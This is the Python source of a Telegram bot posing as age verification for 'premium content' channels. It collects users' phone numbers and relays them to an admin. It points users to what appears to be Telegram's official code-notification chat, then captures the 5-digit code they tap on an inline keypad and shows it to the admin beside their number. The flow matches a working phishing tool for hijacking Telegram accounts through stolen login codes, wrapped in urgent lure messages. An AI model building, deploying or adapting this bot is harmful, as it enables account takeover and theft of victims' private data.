import logging
import random
import asyncio
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ChatJoinRequestHandler, filters, ContextTypes
from telegram.error import BadRequest
import sqlite3
from datetime import datetime, timedelta

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration - Get from Railway environment variables
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', '8314699640'))
CHANNEL_ID = os.getenv('CHANNEL_ID', '-1003161872186')

class VerificationBot:
    def __init__(self):
        self.init_database()
        self.verification_sessions = {}  # Store active verification sessions
        
    def init_database(self):
        """Initialize SQLite database"""
        self.conn = sqlite3.connect('verification.db', check_same_thread=False)
        cursor = self.conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS pending_verifications (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                phone_number TEXT,
                verification_code TEXT,
                entered_code TEXT,
                timestamp DATETIME,
                code_entered_time DATETIME,
                status TEXT DEFAULT 'pending',
                admin_notified BOOLEAN DEFAULT 0
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS verified_users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                phone_number TEXT,
                verified_date DATETIME
            )
        ''')
        
        # Store join requests to track pending approvals
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS pending_join_requests (
                user_id INTEGER,
                chat_id TEXT,
                chat_title TEXT,
                request_date DATETIME,
                status TEXT DEFAULT 'pending',
                PRIMARY KEY (user_id, chat_id)
            )
        ''')
        
        self.conn.commit()

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start command handler - Enhanced with exciting messaging"""
        user = update.message.from_user
        
        welcome_text = f"""
🌟 **Excited to explore something fresh and thrilling?**

🚀 **Confirm your age to unlock an exclusive content collection!**

⚡ **Act fast — spots are limited!**

Hi {user.first_name}! Ready to access premium content?

**Quick Steps:**
1️⃣ Share your contact to verify
2️⃣ Get your exclusive verification code
3️⃣ Enter code and unlock access
4️⃣ Enjoy premium content!

👇 **Tap below to get started!**
        """
        
        # Create contact sharing button
        contact_keyboard = ReplyKeyboardMarkup([
            [KeyboardButton("📱 Share My Contact", request_contact=True)]
        ], resize_keyboard=True, one_time_keyboard=True)
        
        await update.message.reply_text(
            welcome_text, 
            parse_mode='Markdown',
            reply_markup=contact_keyboard
        )
        
        # Store pending verification
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO pending_verifications 
            (user_id, username, first_name, timestamp, status)
            VALUES (?, ?, ?, ?, ?)
        ''', (user.id, user.username, user.first_name, datetime.now(), 'awaiting_contact'))
        self.conn.commit()

    async def handle_join_request(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle new join requests to the channel"""
        try:
            user = update.chat_join_request.from_user
            chat = update.chat_join_request.chat
            
            # Log the join request
            logger.info(f"New join request from {user.first_name} (@{user.username}) to {chat.title}")
            
            # Store join request details
            cursor = self.conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO pending_join_requests 
                (user_id, chat_id, chat_title, request_date, status)
                VALUES (?, ?, ?, ?, ?)
            ''', (user.id, str(chat.id), chat.title, datetime.now(), 'pending'))
            self.conn.commit()
            
            # Check if user is already verified
            cursor.execute('SELECT * FROM verified_users WHERE user_id = ?', (user.id,))
            if cursor.fetchone():
                # User is already verified, approve immediately
                await context.bot.approve_chat_join_request(chat.id, user.id)
                
                # Update join request status
                cursor.execute('''
                    UPDATE pending_join_requests 
                    SET status = 'approved' 
                    WHERE user_id = ? AND chat_id = ?
                ''', (user.id, str(chat.id)))
                self.conn.commit()
                
                await context.bot.send_message(
                    user.id,
                    "✅ **Welcome back!**\n\n🎉 You're already verified! Access granted instantly!",
                    parse_mode='Markdown'
                )
                return
            
            # Notify admin about the join request
            admin_message = f"""
🔔 **New Join Request**

👤 **User:** {user.first_name} (@{user.username})
🆔 **User ID:** `{user.id}`
📢 **Channel:** {chat.title}
🆔 **Chat ID:** `{chat.id}`
⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

⏳ Awaiting verification completion.
            """
            await context.bot.send_message(ADMIN_ID, admin_message, parse_mode='Markdown')
            
            # Send exciting verification message to user
            verification_message = f"""
🎯 **Premium Access Awaits!**

Hey {user.first_name}! 

🔥 You're one step away from accessing **{chat.title}**!

✨ **Good news:** Your request is saved! Complete verification once and you're in!

💫 Type /start to unlock access now!
            """
            
            await context.bot.send_message(user.id, verification_message, parse_mode='Markdown')
            
        except Exception as e:
            logger.error(f"Error handling join request: {e}")
            await context.bot.send_message(ADMIN_ID, f"❌ Error handling join request: {e}")

    async def handle_contact(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle contact sharing with animated response"""
        try:
            user = update.message.from_user
            contact = update.message.contact
            
            # Verify it's the user's own contact
            if contact.user_id != user.id:
                await update.message.reply_text(
                    "❌ Please share YOUR OWN contact to proceed!",
                    reply_markup=ReplyKeyboardRemove()
                )
                return
            
            # Update database with phone number
            cursor = self.conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO pending_verifications 
                (user_id, username, first_name, phone_number, timestamp, status)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (user.id, user.username, user.first_name, contact.phone_number, datetime.now(), 'contact_shared'))
            self.conn.commit()
            
            # Send animated "Sending code..." message
            loading_msg = await update.message.reply_text(
                "📤 **Sending code...**",
                parse_mode='Markdown',
                reply_markup=ReplyKeyboardRemove()
            )
            
            # Simulate processing delay
            await asyncio.sleep(1.5)
            
            # Delete loading message
            await loading_msg.delete()
            
            # Create button to get verification code
            code_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Get code!", url="https://t.me/+42777")]
            ])
            
            # Send main message
            await update.message.reply_text(
                f"""
✅ **Enter the code!**

📞 Contact verified: `{contact.phone_number}`

**Next Step:**
👇 Click the button below to receive your verification code!

⏰ **Important:** Keep this chat open - you'll enter your code here!
                """,
                parse_mode='Markdown',
                reply_markup=code_keyboard
            )
            
            # Send detailed notification to admin with action buttons
            admin_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(f"🔢 Setup Code for {user.first_name}", callback_data=f"setup_code_{user.id}")],
                [InlineKeyboardButton("📋 View Pending Users", callback_data="view_pending")]
            ])
            
            admin_notification = f"""
📱 **Contact Info Received - Action Required**

👤 **User:** {user.first_name} (@{user.username})
🆔 **User ID:** `{user.id}`
📞 **Phone:** `{contact.phone_number}`
⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

**Next Action:** Setup verification code for this user.

**Instructions:**
1. Click "Setup Code" button
2. System generates 5-digit code
3. **Send code via SMS/call to user**
4. User enters code in bot
5. Review and approve/reject

⚠️ **Note:** Bot does NOT auto-send code. You must send it manually.
            """
            
            await context.bot.send_message(
                ADMIN_ID, 
                admin_notification, 
                parse_mode='Markdown',
                reply_markup=admin_keyboard
            )
            
        except Exception as e:
            logger.error(f"Error handling contact: {e}")
            await update.message.reply_text("❌ Error processing contact. Please try /start again.")

    async def handle_admin_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle admin callback buttons"""
        query = update.callback_query
        
        # Only admin can use these buttons
        if query.from_user.id != ADMIN_ID:
            await query.answer("❌ Admin only function")
            return
            
        await query.answer()
        
        if query.data.startswith('setup_code_'):
            user_id = int(query.data.split('_')[2])
            
            # Generate 5-digit verification code
            verification_code = str(random.randint(10000, 99999))
            
            # Update database with code
            cursor = self.conn.cursor()
            cursor.execute('''
                UPDATE pending_verifications 
                SET verification_code = ?, status = 'code_ready'
                WHERE user_id = ?
            ''', (verification_code, user_id))
            self.conn.commit()
            
            # Get user info
            cursor.execute('''
                SELECT first_name, username, phone_number 
                FROM pending_verifications 
                WHERE user_id = ?
            ''', (user_id,))
            user_info = cursor.fetchone()
            
            if user_info:
                first_name, username, phone_number = user_info
                
                # Send code input interface to user
                await self.send_code_input_interface(context, user_id, verification_code)
                
                # Show the generated code to admin ONLY
                await query.edit_message_text(
                    f"""
🔢 **Code Generated - SEND THIS TO USER**

👤 **User:** {first_name} (@{username})
📞 **Phone:** `{phone_number}`
🔢 **Generated Code:** `{verification_code}`

**CRITICAL:** 
⚠️ **SEND CODE `{verification_code}` TO `{phone_number}` NOW**
⚠️ **Bot will NOT auto-send this code**

**Status:**
✅ User interface sent - ready for code entry
⏳ Waiting for you to send code via SMS/call

**Next:** Send `{verification_code}` to `{phone_number}` immediately.
                    """,
                    parse_mode='Markdown'
                )
            else:
                await query.edit_message_text("❌ User not found in pending verifications.")
                
        elif query.data == 'view_pending':
            await self.show_pending_users(query, context)
            
        elif query.data.startswith('approve_user_'):
            user_id = int(query.data.split('_')[2])
            await self.admin_approve_user(query, context, user_id, True)
            
        elif query.data.startswith('reject_user_'):
            user_id = int(query.data.split('_')[2])
            await self.admin_approve_user(query, context, user_id, False)

    async def admin_approve_user(self, query, context, user_id, approved):
        """Admin approves or rejects user verification"""
        try:
            cursor = self.conn.cursor()
            cursor.execute('''
                SELECT first_name, username, phone_number, verification_code, entered_code
                FROM pending_verifications 
                WHERE user_id = ?
            ''', (user_id,))
            
            user_info = cursor.fetchone()
            if not user_info:
                await query.edit_message_text("❌ User not found.")
                return
                
            first_name, username, phone_number, correct_code, entered_code = user_info
            
            if approved:
                # Add to verified users
                cursor.execute('''
                    INSERT OR REPLACE INTO verified_users 
                    (user_id, username, first_name, phone_number, verified_date)
                    VALUES (?, ?, ?, ?, ?)
                ''', (user_id, username, first_name, phone_number, datetime.now()))
                
                # Update pending verification status
                cursor.execute('''
                    UPDATE pending_verifications 
                    SET status = 'verified'
                    WHERE user_id = ?
                ''', (user_id,))
                
                self.conn.commit()
                
                # Approve all pending join requests
                approved_chats = await self.approve_pending_join_requests(context, user_id)
                
                if approved_chats:
                    chat_list = "\n".join([f"✨ {chat}" for chat in approved_chats])
                    status_text = f"""
🎉 **VERIFICATION COMPLETE!**

🔓 **Access Granted!**

You've been automatically approved for:
{chat_list}

🚀 **Welcome to premium content!**

💫 No need to request again - you're in!
                    """
                else:
                    status_text = f"""
🎉 **VERIFICATION COMPLETE!**

✅ **Your account is now verified!**

🔓 **Benefits unlocked:**
• Instant access to private channels
• Auto-approval for future requests
• Premium content access

🌟 **Channel ID:** `{CHANNEL_ID}`

Welcome aboard! 🚀
                    """
                
                # Notify user of approval
                await context.bot.send_message(user_id, status_text, parse_mode='Markdown')
                
                # Update admin message
                await query.edit_message_text(
                    f"""
✅ **User Verification APPROVED**

👤 **User:** {first_name} (@{username})
📱 **Phone:** {phone_number}
🔢 **Sent Code:** `{correct_code}`
🔢 **User Entered:** `{entered_code}`
⏰ **Approved:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📢 **Auto-approved for:** {len(approved_chats)} channel(s)

✅ **Status:** Verified and active
                    """,
                    parse_mode='Markdown'
                )
                
            else:
                # Rejection
                cursor.execute('''
                    UPDATE pending_verifications 
                    SET status = 'rejected'
                    WHERE user_id = ?
                ''', (user_id,))
                self.conn.commit()
                
                # Notify user of rejection
                rejection_text = f"""
❌ **Verification Failed**

⚠️ The code you entered doesn't match our records.

**Your entry:** `{entered_code}`

🔄 **Want to try again?**
Type /start to restart verification process.

💡 Make sure you enter the exact code sent to your phone.
                """
                
                await context.bot.send_message(user_id, rejection_text, parse_mode='Markdown')
                
                # Update admin message
                await query.edit_message_text(
                    f"""
❌ **User Verification REJECTED**

👤 **User:** {first_name} (@{username})
📱 **Phone:** {phone_number}
🔢 **Sent Code:** `{correct_code}`
🔢 **User Entered:** `{entered_code}`
⏰ **Rejected:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

❌ **Status:** Code mismatch - verification denied
                    """,
                    parse_mode='Markdown'
                )
            
            # Clean up session
            if user_id in self.verification_sessions:
                del self.verification_sessions[user_id]
                
        except Exception as e:
            logger.error(f"Error in admin approval: {e}")
            await query.edit_message_text("❌ Error processing approval. Please try again.")

    async def approve_pending_join_requests(self, context, user_id):
        """Approve all pending join requests for a verified user"""
        approved_chats = []
        
        try:
            cursor = self.conn.cursor()
            cursor.execute('''
                SELECT chat_id, chat_title 
                FROM pending_join_requests 
                WHERE user_id = ? AND status = 'pending'
            ''', (user_id,))
            
            pending_requests = cursor.fetchall()
            
            for chat_id, chat_title in pending_requests:
                try:
                    # Convert chat_id back to int
                    if chat_id.lstrip('-').isdigit():
                        chat_id_int = int(chat_id)
                    else:
                        chat_id_int = chat_id
                    
                    # Approve the join request
                    await context.bot.approve_chat_join_request(chat_id_int, user_id)
                    
                    # Update status to approved
                    cursor.execute('''
                        UPDATE pending_join_requests 
                        SET status = 'approved'
                        WHERE user_id = ? AND chat_id = ?
                    ''', (user_id, chat_id))
                    
                    approved_chats.append(chat_title)
                    logger.info(f"Auto-approved join request for user {user_id} in {chat_title}")
                    
                except BadRequest as e:
                    logger.error(f"Failed to approve join request: {e}")
                    cursor.execute('''
                        UPDATE pending_join_requests 
                        SET status = 'failed'
                        WHERE user_id = ? AND chat_id = ?
                    ''', (user_id, chat_id))
                except Exception as e:
                    logger.error(f"Unexpected error: {e}")
            
            self.conn.commit()
            
        except Exception as e:
            logger.error(f"Error in approve_pending_join_requests: {e}")
        
        return approved_chats

    async def show_pending_users(self, query, context):
        """Show pending verification users to admin"""
        cursor = self.conn.cursor()
        cursor.execute('''
            SELECT user_id, first_name, username, phone_number, timestamp, status, entered_code, verification_code
            FROM pending_verifications 
            WHERE status IN ('contact_shared', 'awaiting_contact', 'code_ready', 'code_entered')
            ORDER BY timestamp DESC
        ''')
        
        pending = cursor.fetchall()
        
        if not pending:
            await query.edit_message_text("📋 No pending verifications at the moment.")
            return
            
        message = "📋 **Pending Verifications:**\n\n"
        
        for user in pending:
            user_id, first_name, username, phone, timestamp, status, entered_code, verification_code = user
            
            # Get pending join requests
            cursor.execute('''
                SELECT COUNT(*) FROM pending_join_requests 
                WHERE user_id = ? AND status = 'pending'
            ''', (user_id,))
            pending_joins = cursor.fetchone()[0]
            
            status_emoji = {
                'awaiting_contact': '⏳',
                'contact_shared': '📱',
                'code_ready': '🔢',
                'code_entered': '✏️'
            }
            
            message += f"{status_emoji.get(status, '❓')} **{first_name}** (@{username})\n"
            message += f"   📞 `{phone or 'No contact yet'}`\n"
            message += f"   🕐 {timestamp}\n"
            message += f"   📊 Status: {status}\n"
            message += f"   🔗 Pending joins: {pending_joins}\n"
            
            if verification_code and status == 'code_ready':
                message += f"   🔢 Code to send: `{verification_code}`\n"
            elif entered_code and verification_code:
                message += f"   🔢 Generated: `{verification_code}` | Entered: `{entered_code}`\n"
                
            message += "\n"
            
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Refresh", callback_data="view_pending")]
        ])
        
        await query.edit_message_text(message, parse_mode='Markdown', reply_markup=keyboard)

    async def send_code_input_interface(self, context, user_id, verification_code):
        """Send numeric input interface matching screenshot design"""
        try:
            # Create numeric keyboard with rounded button style
            keyboard = [
                [InlineKeyboardButton('1', callback_data=f'num_1_{user_id}'),
                 InlineKeyboardButton('2', callback_data=f'num_2_{user_id}'),
                 InlineKeyboardButton('3', callback_data=f'num_3_{user_id}')],
                [InlineKeyboardButton('4', callback_data=f'num_4_{user_id}'),
                 InlineKeyboardButton('5', callback_data=f'num_5_{user_id}'),
                 InlineKeyboardButton('6', callback_data=f'num_6_{user_id}')],
                [InlineKeyboardButton('7', callback_data=f'num_7_{user_id}'),
                 InlineKeyboardButton('8', callback_data=f'num_8_{user_id}'),
                 InlineKeyboardButton('9', callback_data=f'num_9_{user_id}')],
                [InlineKeyboardButton('0', callback_data=f'num_0_{user_id}')]
            ]
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            # Send message with "..." animation style
            message = f"""
✅ **Enter the code!**

**Tap the numbers below:**

⚪⚪⚪⚪⚪

...
            """
            
            await context.bot.send_message(
                user_id,
                message,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
            
            # Initialize verification session
            self.verification_sessions[user_id] = {
                'entered_code': '',
                'correct_code': verification_code,
                'message_sent': True
            }
            
        except Exception as e:
            logger.error(f"Error sending code interface: {e}")

    async def handle_user_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle user inline keyboard callbacks"""
        try:
            query = update.callback_query
            user_id = query.from_user.id
            data = query.data
            
            await query.answer()
            
            # Verify session
            if not data.endswith(f'_{user_id}'):
                await query.edit_message_text("❌ Session error. Please /start again.")
                return
                
            if user_id not in self.verification_sessions:
                await query.edit_message_text("❌ Session expired. Contact admin to resend code.")
                return
            
            session = self.verification_sessions[user_id]
            
            if data.startswith(f'num_'):
                # Add number to entered code
                number = data.split('_')[1]
                if len(session['entered_code']) < 5:
                    session['entered_code'] += number
                    
                # Update display with filled circles
                filled = '⚫' * len(session['entered_code'])
                empty = '⚪' * (5 - len(session['entered_code']))
                display_code = filled + empty
                
                # Show updated message
                await query.edit_message_text(
                    f"""
✅ **Enter the code!**

**Tap the numbers below:**

{display_code}

...
                    """,
                    parse_mode='Markdown',
                    reply_markup=query.message.reply_markup
                )
                
                # Auto-submit when 5 digits entered
                if len(session['entered_code']) == 5:
                    await asyncio.sleep(0.5)  # Brief pause for user to see completion
                    await self.submit_verification_code(query, context, user_id, session)
                
        except Exception as e:
            logger.error(f"Error handling user callback: {e}")
            await query.edit_message_text("❌ Error occurred. Contact support.")

    async def submit_verification_code(self, query, context, user_id, session):
        """Auto-submit verification code when complete"""
        try:
            # Save entered code to database
            cursor = self.conn.cursor()
            cursor.execute('''
                UPDATE pending_verifications 
                SET entered_code = ?, code_entered_time = ?, status = 'code_entered'
                WHERE user_id = ?
            ''', (session['entered_code'], datetime.now(), user_id))
            self.conn.commit()
            
            # Show verification in progress
            await query.edit_message_text(
                f"""
🔄 **Verifying your code...**

Please wait while we process your verification.

⏳ This usually takes just a moment...
                """,
                parse_mode='Markdown'
            )
            
            # Get user info for admin notification
            cursor.execute('''
                SELECT first_name, username, phone_number, verification_code
                FROM pending_verifications 
                WHERE user_id = ?
            ''', (user_id,))
            
            user_info = cursor.fetchone()
            if user_info:
                first_name, username, phone_number, correct_code = user_info
                
                # Create admin approval buttons
                admin_keyboard = InlineKeyboardMarkup([
                    [
                        InlineKeyboardButton("✅ Approve", callback_data=f"approve_user_{user_id}"),
                        InlineKeyboardButton("❌ Reject", callback_data=f"reject_user_{user_id}")
                    ],
                    [InlineKeyboardButton("📋 View All Pending", callback_data="view_pending")]
                ])
                
                # Determine if code matches
                match_status = '✅ CODES MATCH' if session['entered_code'] == correct_code else '❌ CODES DO NOT MATCH'
                
                # Send admin notification
                admin_message = f"""
🔍 **CODE REVIEW REQUIRED**

👤 **User:** {first_name} (@{username})
🆔 **User ID:** `{user_id}`
📱 **Phone:** {phone_number}
⏰ **Submitted:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔢 **Generated Code:** `{correct_code}`
🔢 **User Entered:** `{session['entered_code']}`

**Match Status:** {match_status}

⚠️ **Action Required:** Please review and approve/reject.
                """
                
                await context.bot.send_message(
                    ADMIN_ID,
                    admin_message,
                    parse_mode='Markdown',
                    reply_markup=admin_keyboard
                )
                
        except Exception as e:
            logger.error(f"Error submitting code: {e}")

    async def admin_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show admin statistics"""
        if update.message.from_user.id != ADMIN_ID:
            return
            
        cursor = self.conn.cursor()
        
        # Get stats
        cursor.execute('SELECT COUNT(*) FROM verified_users')
        verified_count = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM pending_verifications WHERE status NOT IN ("verified", "rejected")')
        pending_count = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM pending_verifications WHERE status = "code_entered"')
        awaiting_approval = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM pending_verifications WHERE status = "verified"')
        total_verified = cursor.fetchone()[0]
        
        # Get join request stats
        cursor.execute('SELECT COUNT(*) FROM pending_join_requests WHERE status = "pending"')
        pending_joins = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM pending_join_requests WHERE status = "approved"')
        approved_joins = cursor.fetchone()[0]
        
        stats_message = f"""
📊 **Bot Statistics**

**Verification Status:**
✅ **Verified Users:** {verified_count}
⏳ **Pending Verifications:** {pending_count}
🔍 **Awaiting Approval:** {awaiting_approval}
📈 **Total Processed:** {total_verified}

**Join Requests:**
⏳ **Pending Joins:** {pending_joins}
✅ **Auto-approved:** {approved_joins}

**Recent Verifications:**
        """
        
        # Get recent verifications
        cursor.execute('''
            SELECT first_name, username, verified_date 
            FROM verified_users 
            ORDER BY verified_date DESC 
            LIMIT 5
        ''')
        
        recent = cursor.fetchall()
        for user in recent:
            stats_message += f"\n   ✓ {user[0]} (@{user[1]}) - {user[2]}"
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📋 View Pending", callback_data="view_pending")],
            [InlineKeyboardButton("🔄 Refresh Stats", callback_data="refresh_stats")]
        ])
        
        await update.message.reply_text(stats_message, parse_mode='Markdown', reply_markup=keyboard)

def main():
    """Start the bot"""
    # Create bot instance
    bot = VerificationBot()
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Register handlers
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CommandHandler("stats", bot.admin_stats))
    application.add_handler(MessageHandler(filters.CONTACT, bot.handle_contact))
    application.add_handler(ChatJoinRequestHandler(bot.handle_join_request))
    
    # Callback handlers
    application.add_handler(CallbackQueryHandler(
        bot.handle_admin_callback,
        pattern=r'^(setup_code_|view_pending|approve_user_|reject_user_|refresh_stats)'
    ))
    application.add_handler(CallbackQueryHandler(
        bot.handle_user_callback,
        pattern=r'^num_'
    ))
    
    # Start bot
    logger.info("Bot started successfully!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
